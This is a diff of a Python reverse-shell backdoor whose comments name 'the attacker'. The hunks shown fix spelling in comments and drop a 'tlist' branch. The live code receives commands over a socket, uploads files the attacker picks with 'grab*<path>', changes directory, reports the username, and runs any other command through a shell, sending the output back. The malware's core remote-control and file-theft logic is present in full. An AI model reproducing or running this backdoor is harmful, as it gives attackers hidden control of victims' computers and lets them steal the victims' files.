@@ -46,8 +46,8 @@ def connect():
 
 # if we received grab keyword from the attacker, then this is an indicator for
 # file transfer operation, hence we will split the received commands into two
-# parts, the second part which we intersted in contains the file path, so we will
-# store it into a varaible called path and pass it to transfer function
+# parts, the second part which we interested in contains the file path, so we will
+# store it into a variable called path and pass it to transfer function
             
 # Remember the Formula is  grab*<File Path>
 # Example:  grab*C:\Users\Ghost\Desktop\photo.jpeg
@@ -55,7 +55,7 @@ def connect():
         elif 'grab' in command:            
             grab,path = command.split('*')
             
-            try:                          # when it comes to low level file transfer, alot of things can go wrong, therefore
+            try:                          # when it comes to low level file transfer, allot of things can go wrong, therefore
                                           # we use exception handling (try and except) to protect our script from being crashed
                                           # in case something went wrong, we will send the error that happened and pass the exception
                 transfer(s,path)
@@ -64,7 +64,7 @@ def connect():
                 pass
 
         elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
-            code,directory = command.split(" ") # split up the reiceved command based on space into two variables
+            code,directory = command.split(" ") # split up the received command based on space into two variables
             os.chdir(directory) # changing the directory
             # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
             s.send( "[+] CWD Is " + os.getcwd() )
@@ -75,11 +75,7 @@ def connect():
         elif 'getuid' in command:
         		s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
         
-        elif 'tlist' in command:
-        		file = 'C:\\Program Files\\Debugging Tools for Windows\\tlist.exe'
-        		s.send( "[+] UserID Is " + subprocess.call([file]))
-        	
-        	
+
         else:
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send( CMD.stdout.read()  ) 
